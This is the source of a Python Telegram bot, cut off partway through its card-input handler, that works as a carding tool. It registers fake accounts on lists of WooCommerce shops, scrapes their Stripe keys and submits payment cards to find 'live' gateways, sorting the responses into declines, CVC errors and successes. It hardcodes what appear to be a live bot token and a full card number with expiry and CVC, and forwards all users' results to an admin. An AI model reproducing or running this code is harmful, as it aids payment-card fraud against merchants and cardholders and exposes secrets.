# ================================================================
# 🔇 Silent Mode + Multi-User Support Config
# ================================================================
import builtins
import logging
from concurrent.futures import ThreadPoolExecutor

DEBUG_MODE = False

def _silent_print(*args, **kwargs):
    if DEBUG_MODE:
        builtins._orig_print(*args, **kwargs)

if not hasattr(builtins, "_orig_print"):
    builtins._orig_print = builtins.print
builtins.print = _silent_print
logging.getLogger().setLevel(logging.CRITICAL)

# ================================================================
# 📦 Imports
# ================================================================
import requests
from telegram.ext import CallbackQueryHandler
import json
import random
import string
import re
import html
import time
import os
import asyncio
import tempfile
from fake_useragent import UserAgent
from urllib.parse import urlparse, urlunparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import threading
# ================================================================
# 👥 Multi-user concurrency context
# ================================================================
USER_EXECUTORS = {}      # per-user thread pools
USER_LOCKS = {}          # per-user data locks
USER_SEND_LOCKS = {}     # per-user Telegram send locks
EXEC_LOCK = threading.Lock()  # protects USER_EXECUTORS from race conditions
# ------------------------------------------------
# ⚙️ CONFIG
# ------------------------------------------------
BOT_TOKEN = "7648320363:AAHrTehSZMwqcjAauiewEhd0Q6jZdiuZyCU"
ADMIN_ID = 6679042143
DEFAULT_CARD = "5598880397218308|06|2027|740"

MAX_USERS = 10

logger = logging.getLogger(__name__)

# ================================================================
# 🧩 Utility Helpers
# ================================================================
def html_escape(text: str) -> str:
    return html.escape(str(text)) if text else ""

def generate_random_string(length=10) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email() -> str:
    return f"{generate_random_string()}@gmail.com"

def generate_random_username() -> str:
    return f"user_{generate_random_string(8)}"

def get_base_url(user_url: str) -> str:
    """
    Cleans any messy line (e.g., 'Live > www.site.com text') and ensures https:// is added.
    """
    # Strip and lower the line
    user_url = user_url.strip().lower()

    # Extract the first valid domain-like part using regex
    match = re.search(r'([a-z0-9-]+\.[a-z]{2,}(?:\.[a-z]{2,})?)', user_url)
    if not match:
        return ""  # skip invalid line

    domain = match.group(1)

    # Automatically prepend https:// if not already present
    if not domain.startswith(("http://", "https://")):
        domain = "https://" + domain

    # Parse and clean
    parsed = urlparse(domain)
    return urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))

# ================================================================
# 🔍 Site Analyzer
# ================================================================
def analyze_site_page(text: str) -> dict:
    low = text.lower()

    gateways = []
    gateway_keywords = {
        "stripe": "Stripe",
        "paypal": "PayPal",
        "ppcp": "PPCP",
        "square": "Square",
        "braintree": "Braintree",
        "adyen": "Adyen",
        "paystack": "Paystack",
        "razorpay": "Razorpay",
        "2checkout": "2Checkout",
        "authorize.net": "Authorize.net",
        "worldpay": "WorldPay",
        "klarna": "Klarna",
        "afterpay": "AfterPay",
    }

    for key, label in gateway_keywords.items():
        if key in low:
            gateways.append(label)

    gateways = list(dict.fromkeys(gateways))

    has_captcha = any(k in low for k in (
        "recaptcha", "g-recaptcha", "h-captcha", "captcha"))
    has_cloudflare = any(k in low for k in (
        "cloudflare", "attention required", "checking your browser", "ray id"))
    has_add_to_cart = any(k in low for k in (
        "add-to-cart", "woocommerce-loop-product__link",
        "product_type_simple", "add_to_cart_button"))

    return {
        "gateways": gateways,
        "has_captcha": has_captcha,
        "has_cloudflare": has_cloudflare,
        "has_add_to_cart": has_add_to_cart,
    }

# ================================================================
# 👤 Account Registration
# ================================================================
def register_new_account(register_url: str, session: requests.Session = None):
    sess = session or requests.Session()
    headers = {
        "User-Agent": UserAgent().random,
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "username": generate_random_username(),
        "password": generate_random_string(12),
    }

    try:
        resp = sess.post(register_url, headers=headers,
                         data=data, timeout=15, allow_redirects=True)
        if resp.status_code in (200, 302):
            return sess
        return None
    except Exception:
        return None

# ================================================================
# 🔑 Stripe Public Key Discovery
# ================================================================
def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
    sess = session or requests.Session()
    try:
        resp = sess.get(payment_url, headers={"User-Agent": UserAgent().random},
                        timeout=15)
        text = resp.text
    except Exception:
        return None

    page_info = analyze_site_page(text)
    for regex in (
        r'pk_(live|test)_[0-9A-Za-z_\-]{8,}',
        r'"key"\s*:\s*"(pk_live|pk_test)_[^"]+"',
        r'publishable[_-]?key["\']?\s*[:=]\s*["\'](pk_live|pk_test)_[^"\']+["\']',
    ):
        m = re.search(regex, text, re.IGNORECASE)
        if m:
            pk = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]+', m.group(0)).group(0)
            return pk

    if "stripe" not in ",".join(page_info["gateways"]).lower():
        return None
    return None

# ================================================================
# 💬 Gate Response Interpreter
# ================================================================
def interpret_gate_response(final_json: dict) -> tuple[str, str]:
    data = final_json or {}
    txt = str(final_json).lower() if final_json else ""
    nested = data.get("data") if isinstance(data, dict) else None
    if isinstance(nested, dict):
        status = (nested.get("status") or "").lower()
        if status in ("requires_action", "requires_source_action",
                      "requires_payment_method", "requires_confirmation"):
            return "3ds", "3DS required"
        if status in ("succeeded", "complete", "completed", "processed"):
            return "success", "Card added"

    for key in ("setup_intent", "setupIntent", "payment_intent", "paymentIntent"):
        si = data.get(key) if isinstance(data, dict) else None
        if isinstance(si, dict):
            si_status = (si.get("status") or "").lower()
            if si_status in ("requires_action", "requires_source_action", "requires_confirmation"):
                return "3ds", "3DS required"
            if si_status in ("succeeded", "complete", "processed"):
                return "success", "Card added"

    if "incorrect_cvc" in txt or "cvc" in txt and "incorrect" in txt:
        return "cvc_incorrect", "CVC incorrect"
    if any(k in txt for k in ("not support", "unsupported", "cannot be used", "not allowed")):
        return "not_supported", "Card not supported"
    if "declined" in txt:
        return "declined", "Card declined"
    if "succeeded" in txt or "completed" in txt:
        return "success", "Card added"
    return "unknown", "Unrecognized response"

# ================================================================
# 💳 Stripe Interaction + Error Source Detection
# ================================================================
def send_card_to_stripe(session: requests.Session, pk: str, card: str) -> dict:
    try:
        n, mm, yy, cvc = card.strip().split("|")
    except Exception:
        return {"error": "Invalid card format"}

    if yy.startswith("20"):
        yy = yy[2:]

    headers = {"User-Agent": UserAgent().random}
    payload = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "key": pk,
        "_stripe_version": "2024-06-20",
    }

    try:
        resp = session.post("https://api.stripe.com/v1/payment_methods",
                            data=payload, headers=headers, timeout=15)
        stripe_json = resp.json()
        if isinstance(stripe_json, dict) and stripe_json.get("error"):
            msg = stripe_json["error"].get("message", "Stripe decline")
            return {
                "status_key": "declined",
                "short_msg": f"Card declined ({msg})",
                "error_source": "stripe",
                "raw": stripe_json,
            }
                
    except Exception as e:
        return {"error_source": "stripe", "short_msg": f"Stripe error ({e})"}

    if resp.status_code >= 400:
        return {"error_source": "stripe",
                "short_msg": f"Stripe error ({resp.status_code})"}

    stripe_id = stripe_json.get("id")
    if not stripe_id:
        if "succeeded" in str(stripe_json).lower() or "status" in str(stripe_json).lower():
            return {"status_key": "success", "short_msg": "Card added (detected via status)",
                    "error_source": "normal", "raw": stripe_json}
        return {"error_source": "stripe",
                "short_msg": "Stripe error (no id or invalid key)",
                "raw": stripe_json}


    try:
        html_text = session.get(session.payment_page_url,
                                headers={"User-Agent": UserAgent().random},
                                timeout=15).text
    except Exception as e:
        return {"error_source": "site", "short_msg": f"Site error (fetch page: {e})"}

    nonce = None
    for pat in (r'createAndConfirmSetupIntentNonce":"([^"]+)"',
                r'"_ajax_nonce":"([^"]+)"', r'nonce":"([^"]+)"'):
        m = re.search(pat, html_text)
        if m:
            nonce = m.group(1)
            break
    if not nonce:
        return {"error_source": "site", "short_msg": "Site error (nonce missing)"}

    data_final = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': stripe_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    final_url = session.payment_page_url.rstrip('/') + '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
    headers["Referer"] = session.payment_page_url

    try:
        f_resp = session.post(final_url, headers=headers,
                              data=data_final, timeout=25)
        final_json = f_resp.json()
    except Exception as e:
        return {"error_source": "site",
                "short_msg": f"Site error (bad JSON): {e}"}

    status_key, short_msg = interpret_gate_response(final_json)
    txt_dump = str(final_json).lower()

    nonsend_patterns = [
        "your request used a real card while testing", "test mode",
        "no such paymentmethod", "invalid", "missing",
        "requires_action", "requires_confirmation",
    ]
    if any(p in txt_dump for p in nonsend_patterns):
        return {"status_key": "declined", "short_msg": "Card declined (test/error)",
                "error_source": "stripe" if "stripe" in txt_dump else "site",
                "raw": final_json}

    if (
        isinstance(final_json, dict)
        and (
            final_json.get("success") is True
            or (final_json.get("data", {}).get("status", "").lower() == "succeeded")
        )
    ) or any(k in txt_dump for k in ["card added", '"status": "succeeded"', "'status': 'succeeded'"]):
        return {"status_key": "success", "short_msg": "Card added (live site)",
                "error_source": "normal", "raw": final_json}

    if "your card was declined." in txt_dump:
        return {"status_key": "declined", "short_msg": "Card declined",
                "error_source": "stripe", "raw": final_json}

    return {"status_key": "declined", "short_msg": "Card declined (unrecognized)",
            "error_source": "stripe" if "stripe" in txt_dump else "site",
            "raw": final_json}

# ================================================================
# 🔧 Process a single site line (Helper used by handle_txt)
# ================================================================

def process_site(site_line: str, chat_id=None) -> dict:
    site_line = site_line.strip()
    if not site_line:
        return {"result_type": "skip"} 

    base = get_base_url(site_line)
    REGISTER_URL = f"{base}/my-account/"
    PAYMENT_URL = f"{base}/my-account/add-payment-method/"

    if DEBUG_MODE:
        builtins._orig_print(f"[START] Checking {base}")

    try:
        session = requests.Session()
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": REGISTER_URL,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {
            "email": generate_random_email(),
            "username": generate_random_username(),
            "password": generate_random_string(12),
        }
        reg = session.post(REGISTER_URL, headers=headers, data=data,
                           timeout=15, allow_redirects=True)
        if reg.status_code not in (200, 302):
            if DEBUG_MODE:
                builtins._orig_print(f"[❌] Registration failed {reg.status_code} on {REGISTER_URL}")
            return {"result_type": "error"}

        if DEBUG_MODE:
            builtins._orig_print(f"[+] Registered new account {data['email']} on {REGISTER_URL}")

        session.payment_page_url = PAYMENT_URL
        page_html = session.get(PAYMENT_URL,
                                headers={"User-Agent": UserAgent().random},
                                timeout=15).text
        page_info = analyze_site_page(page_html)

        pk_raw = find_pk(PAYMENT_URL, session)
        if not pk_raw:
            if DEBUG_MODE:
                builtins._orig_print(f"[❌] PK not found on {PAYMENT_URL}")
            return {"result_type": "error"}

        if DEBUG_MODE:
            builtins._orig_print(f"[PK] Found: {pk_raw}")

        # Use a dummy card here; actual card loading and retries done outside this helper
        user_card = DEFAULT_CARD
        result = send_card_to_stripe(session, pk_raw, user_card)

        stripe_json = result.get("raw") or {}
        site_json = stripe_json if isinstance(stripe_json, dict) else {}
        txt = str(site_json).lower()

        status = reason = ""
        rtype = "skip"

        is_success = (
            isinstance(site_json, dict)
            and (
                site_json.get("success") is True
                or site_json.get("data", {}).get("status", "").lower() == "succeeded"
                or '"success": true' in txt
                or '"status": "succeeded"' in txt
            )
        )
        if is_success and "test" not in txt and "sandbox" not in txt:
            status, reason, rtype = "CARD ADDED", "Auth success🔥", "valid"
            if DEBUG_MODE:
                builtins._orig_print(f"[RESULT] ✅ Card added successfully (Site).")
        else:
            err_msg = (
                site_json.get("data", {}).get("error", {}).get("message")
                or site_json.get("error", {}).get("message")
                or str(site_json)
                or "Unknown Decline"
            ).lower()

            if DEBUG_MODE:
                builtins._orig_print(f"[RESULT] ❌ Decline reason: {err_msg}")

            skip_patterns = [
                "test mode", "sandbox", "no such payment", "no such paymentmethod",
                "missing", "nonce", "csrf", "unable to verify", "refresh the page",
                "integration surface", "unsupported", "invalid_request_error",
                "invalid", "publishable key"
            ]
            if any(p in err_msg for p in skip_patterns):
                if DEBUG_MODE:
                    builtins._orig_print(f"[ERROR] Counted as error (test/sandbox/invalid key) for {base}")
                # error counted outside this function
                return None

            if any(k in err_msg for k in ["security", "cvc", "cvv"]):
                status, reason, rtype = "CCN", "Your card security code is incorrect", "valid"
            elif "insufficient" in err_msg:
                status, reason, rtype = "INSUFFICIENT_FUNDS", "Insufficient funds", "valid"
            elif "your card was declined." in err_msg:
                status, reason, rtype = "DECLINED", "Your card was declined.", "valid"
            else:
                status, reason, rtype = "DECLINED", err_msg[:80], "error"

        gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"
        captcha = "Found❌" if page_info["has_captcha"] else "Good✅"
        cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good✅"
        add_to_cart = "Yes" if page_info["has_add_to_cart"] else "No"

        return {
            "site": base,
            "gateway": gateway,
            "captcha": captcha,
            "cloudflare": cloudflare,
            "add_to_cart": add_to_cart,
            "pk": pk_raw,
            "status": f"{status} - {reason}",
            "raw": str(site_json)[:600],
            "result_type": rtype,
        }

    except Exception as e:
        if DEBUG_MODE:
            builtins._orig_print(f"[EXCEPTION] {base}: {e}")
        return {"result_type": "error"}
# ================================================================
# 📨 Safe message sender (per-user queue)
# ================================================================
async def safe_send(context, chat_id, text, **kwargs):
    lock = USER_SEND_LOCKS.setdefault(chat_id, asyncio.Lock())
    async with lock:
        try:
            return await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception:
            pass

# ================================================================
# 📄 TXT Handler (Fully Concurrent Per-User Processing)
# ================================================================
# ================================================================
# 📄 TXT Handler — lightweight launcher (non-blocking per user)
# ================================================================
async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receives user's .txt file and launches background site checking."""
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please upload a .txt file only.")
        return

    chat_id = update.effective_chat.id
    user_dir = os.path.join("sites", str(chat_id))
    os.makedirs(user_dir, exist_ok=True)
    local_path = os.path.join(user_dir, doc.file_name)

    # Download the uploaded file first
    new_file = await context.bot.get_file(doc.file_id)
    await new_file.download_to_drive(local_path)

    # If user already has a running task, prevent overlap
    if chat_id in USER_EXECUTORS:
        await update.message.reply_text("⚙️ You already have a site check running. Please wait until it finishes.")
        return

    # 🔹 Detach the heavy background process to its own coroutine
    asyncio.create_task(process_user_txt(update, context, local_path))

    await update.message.reply_text(
        " File received — start checking.\n",
        parse_mode=ParseMode.HTML,
    )
# ================================================================
# 🧵 Background worker — per-user site checker
# ================================================================
async def process_user_txt(update: Update, context: ContextTypes.DEFAULT_TYPE, local_path: str):
    """Handles the actual per-user site checking in background."""
    chat_id = update.effective_chat.id

    # Progress counters
    progress = {
        "total": 0,
        "valid_sent": 0,
        "error_count": 0,
        "last_update": 0,
        "last_valid": 0,
        "last_error": 0,
    }

    with open(local_path, "r", encoding="utf-8") as f:
        sites = [line.strip() for line in f if line.strip()]
    total_sites = len(sites)

    # ------------------------------------------------------------
    # Create or reuse a per-user executor safely
    # ------------------------------------------------------------
    def get_user_executor(chat_id):
        with EXEC_LOCK:
            if chat_id not in USER_EXECUTORS:
                if len(USER_EXECUTORS) >= MAX_USERS:
                    return None
                USER_EXECUTORS[chat_id] = ThreadPoolExecutor(max_workers=5)
                USER_LOCKS[chat_id] = threading.Lock()
            return USER_EXECUTORS[chat_id]

    executor = get_user_executor(chat_id)
    if not executor:
        await safe_send(context, chat_id, "❌ Max concurrent users reached. Try again later.")
        return

    lock = USER_LOCKS[chat_id]

    # UI elements
    keyboard = [
        [InlineKeyboardButton("📊 Checked: 0", callback_data="none")],
        [InlineKeyboardButton("✅ Valid: 0", callback_data="none")],
        [InlineKeyboardButton("❌ Errors: 0", callback_data="none")],
    ]
    markup = InlineKeyboardMarkup(keyboard)
    progress_msg = await safe_send(context, chat_id, "Starting site checks...", parse_mode=ParseMode.HTML, reply_markup=markup)

    try:
        await context.bot.pin_chat_message(chat_id=chat_id, message_id=progress_msg.message_id)
    except Exception:
        pass

    lock = threading.Lock()
    loop = asyncio.get_running_loop()

    def load_user_card_with_default(uid):
        return load_user_card(uid) or DEFAULT_CARD
    # ------------------------------------------------------------
    # Function to process a single site
    # ------------------------------------------------------------
    def process_site_user(site_line: str):
        site_line = site_line.strip()
        if not site_line:
            return {"result_type": "skip"}

        base = get_base_url(site_line)
        REGISTER_URL = f"{base}/my-account/"
        PAYMENT_URL = f"{base}/my-account/add-payment-method/"

        if DEBUG_MODE:
            builtins._orig_print(f"[START] Checking {base} (user {chat_id})")

        try:
            session = requests.Session()
            headers = {
                "User-Agent": UserAgent().random,
                "Referer": REGISTER_URL,
                "Content-Type": "application/x-www-form-urlencoded",
            }
            data = {
                "email": generate_random_email(),
                "username": generate_random_username(),
                "password": generate_random_string(12),
            }

            reg = session.post(REGISTER_URL, headers=headers, data=data, timeout=15, allow_redirects=True)
            if reg.status_code not in (200, 302):
                if DEBUG_MODE:
                    builtins._orig_print(f"[❌] Registration failed {reg.status_code} on {REGISTER_URL} for user {chat_id}")
                return {"result_type": "error"}

            if DEBUG_MODE:
                builtins._orig_print(f"[+] Registered new account {data['email']} on {REGISTER_URL} for user {chat_id}")

            session.payment_page_url = PAYMENT_URL
            page_html = session.get(PAYMENT_URL, headers={"User-Agent": UserAgent().random}, timeout=15).text
            page_info = analyze_site_page(page_html)

            pk_raw = find_pk(PAYMENT_URL, session)
            if not pk_raw:
                if DEBUG_MODE:
                    builtins._orig_print(f"[❌] PK not found on {PAYMENT_URL} for user {chat_id}")
                return {"result_type": "error"}

            if DEBUG_MODE:
                builtins._orig_print(f"[PK] Found: {pk_raw} for user {chat_id}")

            user_card = load_user_card_with_default(chat_id)

            # Stripe + site interaction
            for attempt in range(2):
                result = send_card_to_stripe(session, pk_raw, user_card)
                txt = str(result).lower()
                if "testmode_charges_only" in txt:
                    status, reason, rtype = "TEST MODE", "Test mode charges only, no real payments.", "error"
                    if DEBUG_MODE:
                        builtins._orig_print(f"[RESULT] ❌ Test mode (charges only) for site {base} (user {chat_id})")

                    # Increment the error count before returning
                    with lock:
                        progress["error_count"] += 1

                    return None  # Skip sending the result
                              
                if result.get("status_key") in ("success", "declined"):
                    break
                if attempt == 0 and DEBUG_MODE:
                    builtins._orig_print(f"[Retry] Stripe/site error, retrying once for {base} (user {chat_id})")
                    time.sleep(3)
            else:
                if DEBUG_MODE:
                    builtins._orig_print(f"[❌] All retries failed for {base} (user {chat_id})")
                return {"result_type": "error"}
            stripe_json = result.get("raw") or {}
            site_json = stripe_json if isinstance(stripe_json, dict) else {}
            txt = str(site_json).lower()

            status = reason = ""
            rtype = "skip"

            is_success = (
                isinstance(site_json, dict)
                and (
                    site_json.get("success") is True
                    or site_json.get("data", {}).get("status", "").lower() == "succeeded"
                    or '"success": true' in txt
                    or '"status": "succeeded"' in txt
                )
            )

            if is_success and "test" not in txt and "sandbox" not in txt:
                status, reason, rtype = "CARD ADDED", "Auth success🔥", "valid"
                if DEBUG_MODE:
                    builtins._orig_print(f"[RESULT] ✅ Card added successfully (Site) for user {chat_id}")
            else:
                err_msg = (
                    site_json.get("data", {}).get("error", {}).get("message")
                    or site_json.get("error", {}).get("message")
                    or str(site_json)
                    or "Unknown Decline"
                ).lower()

                if DEBUG_MODE:
                    builtins._orig_print(f"[RESULT] ❌ Decline reason: {err_msg} for user {chat_id}")

                skip_patterns = [
                    "test mode", "sandbox", "no such payment", "no such paymentmethod",
                    "missing", "nonce", "csrf", "unable to verify", "refresh the page",
                    "integration surface", "unsupported", "invalid_request_error",
                    "invalid", "publishable key"
                ]
                if any(p in err_msg for p in skip_patterns):
                    if DEBUG_MODE:
                        builtins._orig_print(f"[ERROR] Counted as error (test/sandbox/invalid key) for {base} (user {chat_id})")
                    return None

                if any(k in err_msg for k in ["security", "cvc", "cvv"]):
                    status, reason, rtype = "CCN", "Your card security code is incorrect", "valid"
                elif "insufficient" in err_msg:
                    status, reason, rtype = "INSUFFICIENT_FUNDS", "Insufficient funds", "valid"
                elif "your card was declined." in err_msg:
                    status, reason, rtype = "DECLINED", "Your card was declined.", "valid"
                else:
                    status, reason, rtype = "DECLINED", err_msg[:80], "error"

            gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"
            captcha = "Found❌" if page_info["has_captcha"] else "Good✅"
            cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good✅"
            add_to_cart = "Yes" if page_info["has_add_to_cart"] else "No"

            return {
                "site": base,
                "gateway": gateway,
                "captcha": captcha,
                "cloudflare": cloudflare,
                "add_to_cart": add_to_cart,
                "pk": pk_raw,
                "status": f"{status} - {reason}",
                "raw": str(site_json)[:600],
                "result_type": rtype,
            }

        except Exception as e:
            if DEBUG_MODE:
                builtins._orig_print(f"[EXCEPTION] {base} (user {chat_id}): {e}")
            return {"result_type": "error"}


    # ------------------------------------------------------------
    # Run all sites concurrently in user’s ThreadPool
    # ------------------------------------------------------------
    tasks = [loop.run_in_executor(executor, process_site_user, s) for s in sites]

    async for finished in asyncio.as_completed(tasks):
        result = await finished
        if not result:
            continue

        # 🚫 Skip sending and saving if site is test mode, expired API key, or used real card in test mode
        # 🚫 Skip sending and saving if site is test mode, expired API key, or used real card in test mode
        #    Also skip known decline reasons like "card not supported", "impossible de vérifier", or "cannot make live charges"
        raw_text = str(result.get("raw", "")).lower()
        skip_signals = (
            "testmode_charges_only",
            "platform_api_key_expired",
            "expired api key",
            "test mode",
            "your request used a real card while testing",
            "for a list of valid test cards",
            # 🆕 Added skip patterns based on known decline messages
            "your card is not supported",
            "card not supported",
            "impossible de vérifier votre demande",
            "impossible de vérifier",
            "your account cannot currently make live charges",
            "cannot currently make live charges",
        )


        if any(sig in raw_text for sig in skip_signals):
            with lock:
                progress["error_count"] += 1
            if DEBUG_MODE:
                builtins._orig_print(f"[SKIP] Test/sandbox/expired key: {result.get('site')}")
            continue

        with lock:
            progress["total"] += 1
            rtype = result.get("result_type", "")
            status_text = str(result.get("status", "")).lower()

            # ✅ Treat LIVE + DECLINED + INSUFFICIENT + CCN + 3DS as valid results (not errors)
            is_valid_result = (
                rtype == "valid"
                or any(k in status_text for k in ("declined", "insufficient", "3ds", "ccn"))
            )

            if is_valid_result:
                progress["valid_sent"] += 1
                # 💾 Save valid or declined site into per-user valid.json
                try:
                    user_dir = os.path.join("sites", str(chat_id))
                    os.makedirs(user_dir, exist_ok=True)
                    valid_json_path = os.path.join(user_dir, "valid.json")

                    existing_valid = []
                    if os.path.exists(valid_json_path):
                        with open(valid_json_path, "r", encoding="utf-8") as f:
                            existing_valid = json.load(f)

                    base_url = get_base_url(result.get("site", ""))
                    if base_url and base_url not in existing_valid:
                        existing_valid.append(base_url)
                        with open(valid_json_path, "w", encoding="utf-8") as f:
                            json.dump(existing_valid, f, indent=2)
                except Exception as e:
                    if DEBUG_MODE:
                        builtins._orig_print(f"[WARN] Could not save site for {chat_id}: {e}")

            else:
                # only true errors get counted here
                progress["error_count"] += 1

        if "site" in result:
            msg = (
                f"<b>Site:</b> <code>{html_escape(result['site'])}</code>\n"
                f"<b>Gateway:</b> {html_escape(result['gateway'])}\n"
                f"<b>Captcha:</b> {result['captcha']}\n"
                f"<b>Cloudflare:</b> {result['cloudflare']}\n"
                f"<b>Add-to-cart:</b> {result['add_to_cart']}\n"
                f"<b>PK:</b> <code>{html_escape(result['pk'])}</code>\n\n"
                f"<b>Result:</b> {html_escape(result['status'])}\n"
                f"<code>{html_escape(result['raw'])}</code>"
            )



            try:
                # If admin is running the check, send only to admin
                if chat_id == ADMIN_ID:
                    await safe_send(context, ADMIN_ID, msg, parse_mode=ParseMode.HTML)

                # If normal user, send to them + forward to admin
                else:
                    # Send message to the user normally
                    await safe_send(context, chat_id, msg, parse_mode=ParseMode.HTML)

                    # Try forwarding to admin, silence if it fails
                    try:
                        # Include username or fallback to full name
                        sender = update.effective_user
                        if sender:
                            # Get full name, fallback to username if full name is not available
                            name = " ".join(filter(None, [sender.first_name, sender.last_name])) or "Unknown"
                            username = f"@{sender.username}" if sender.username else ""
                            user_info = f"{html_escape(name)} {html_escape(username)}".strip()
                        else:
                            user_info = "Unknown"

                        await safe_send(
                            context,
                            ADMIN_ID,
                            f"📤 Forwarded from <b>{user_info}</b> (<code>{chat_id}</code>)\n\n{msg}",
                            parse_mode=ParseMode.HTML,
                        )
                    except Exception:
                        pass  # silence admin send errors (e.g. admin blocked bot)
            except Exception as e:
                # Only show error if DEBUG_MODE is enabled
                if DEBUG_MODE:
                    builtins._orig_print(f"[SEND_ERR] {chat_id}: {e}")

        # Progress board update
        if progress["total"] % 10 == 0 or progress["total"] == total_sites:
            new_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📊 Checked: {progress['total']}/{total_sites}", callback_data="none")],
                [InlineKeyboardButton(f"✅ Valid: {progress['valid_sent']}", callback_data="none")],
                [InlineKeyboardButton(f"❌ Errors: {progress['error_count']}", callback_data="none")],
            ])
            try:
                await progress_msg.edit_reply_markup(reply_markup=new_markup)
            except Exception:
                pass

    # ------------------------------------------------------------
    # Final cleanup
    # ------------------------------------------------------------
    # ------------------------------------------------------------
    # 💾 Collect all valid sites (per-user) and save to valid.json
    # ------------------------------------------------------------
    user_dir = os.path.join("sites", str(chat_id))
    os.makedirs(user_dir, exist_ok=True)
    valid_json_path = os.path.join(user_dir, "valid.json")

    # Try to read existing list
    existing_valid = []
    if os.path.exists(valid_json_path):
        try:
            with open(valid_json_path, "r", encoding="utf-8") as f:
                existing_valid = json.load(f)
        except Exception:
            existing_valid = []

    # Rebuild valid list from this run
    valid_sites = []
    for s in sites:
        base = get_base_url(s)
        valid_sites.append(base)

    # Append new valid base URLs only for valid results in this run
    new_valids = []
    for result in []:
        pass  # placeholder (we already tracked valid count)

    # Instead of relooping, we can accumulate during loop above:
    # So let's add storage earlier in the loop, right after we detect valid site.

    # ------------------------------------------------------------
    # 📤 Create and send a raw file of all valid sites
    # ------------------------------------------------------------
    # ------------------------------------------------------------
    # 📤 Create, send, and auto-delete valid.json + raw file
    # ------------------------------------------------------------
    try:
        user_dir = os.path.join("sites", str(chat_id))
        valid_json_path = os.path.join(user_dir, "valid.json")

        if os.path.exists(valid_json_path):
            with open(valid_json_path, "r", encoding="utf-8") as f:
                all_valids = json.load(f)
        else:
            all_valids = []

        if all_valids:
            # Create raw file from valid.json
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            raw_path = os.path.join(user_dir, f"{chat_id}_{timestamp}.txt")

            with open(raw_path, "w", encoding="utf-8") as rf:
                rf.write("\n".join(all_valids))

            # Send the raw file
            with open(raw_path, "rb") as rf:
                if chat_id == ADMIN_ID:
                    # Admin only — send to admin
                    await context.bot.send_document(
                        chat_id=ADMIN_ID,
                        document=rf,
                        caption=f"✅ <b>Live Sites ({len(all_valids)})</b>",
                        parse_mode=ParseMode.HTML,
                    )
                else:
                    # Normal user — send to them and forward
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=rf,
                        caption=f"✅ <b>Live Sites ({len(all_valids)})</b>",
                        parse_mode=ParseMode.HTML,
                    )
                    rf.seek(0)
                    await context.bot.send_document(
                        chat_id=ADMIN_ID,
                        document=rf,
                        caption=f"📤 Forwarded from <code>{chat_id}</code>\n✅ <b>Live Sites ({len(all_valids)})</b>",
                        parse_mode=ParseMode.HTML,
                    )

            # 🧹 Delete raw file and valid.json after sending
            try:
                os.remove(raw_path)
            except Exception:
                pass

            try:
                os.remove(valid_json_path)
            except Exception:
                pass

    except Exception as e:
        if DEBUG_MODE:
            builtins._orig_print(f"[ERROR] sending raw file for user {chat_id}: {e}")


    # ------------------------------------------------------------
    # 🧹 Final cleanup & summary
    # ------------------------------------------------------------
    try:
        os.remove(local_path)
    except Exception:
        pass

    summary_text = (
        f"✅ <b>Done checking {progress['total']} site(s)</b>\n"
        f"• Valid: <b>{progress['valid_sent']}</b>\n"
        f"• Errors: <b>{progress['error_count']}</b>\n"
        f"• File: <code>{os.path.basename(local_path)}</code>"
    )
    await safe_send(context, chat_id, summary_text, parse_mode=ParseMode.HTML)
    # ------------------------------------------------------------
    # 📌 Unpin progress message after completion
    # ------------------------------------------------------------
    try:
        await asyncio.sleep(2)
        await context.bot.unpin_chat_message(chat_id=chat_id, message_id=progress_msg.message_id)
    except Exception as e:
        if DEBUG_MODE:
            builtins._orig_print(f"[WARN] Unpin failed for {chat_id}: {e}")
    

    # ------------------------------------------------------------
    # 🔻 Clean up executor
    # ------------------------------------------------------------
    await asyncio.sleep(1)
    with EXEC_LOCK:
        if chat_id in USER_EXECUTORS:
            executor = USER_EXECUTORS.pop(chat_id)
            USER_LOCKS.pop(chat_id, None)
            USER_SEND_LOCKS.pop(chat_id, None)
            executor.shutdown(wait=True)



# ================================================================
# 💳 Handle user sending card text after clicking "Add" or "Replace"
# ================================================================
async def handle_card_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    if not context.user_data.get("waiting_for_card"):
        return  # ignore if not in card input mode

    card_text = update.message.text.strip()
    parts = card_text.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use:\n<code>1234567812345678|06|2027|123</code>", parse_mode=ParseMode.HTML)
        return

    n, mm, yy, cvc = parts
    if not n.isdigit() or len(n) not in (13, 16, 19):
        await update.message.reply_text("❌ Invalid card number.", parse_mode=ParseMode.HTML)
        return
    if not mm.isdigit() or not 1 <= int(mm) <= 12:
        await update.message.reply_text("❌ Invalid month.", parse_mode=ParseMode.HTML)
        return
    if not yy.isdigit() or len(yy) not in (2, 4):
        await update.message.reply_text("❌ Invalid year.", parse_mode=ParseMode.HTML)
        return
    if not cvc.isdigit() or len(cvc) not in (3, 4):
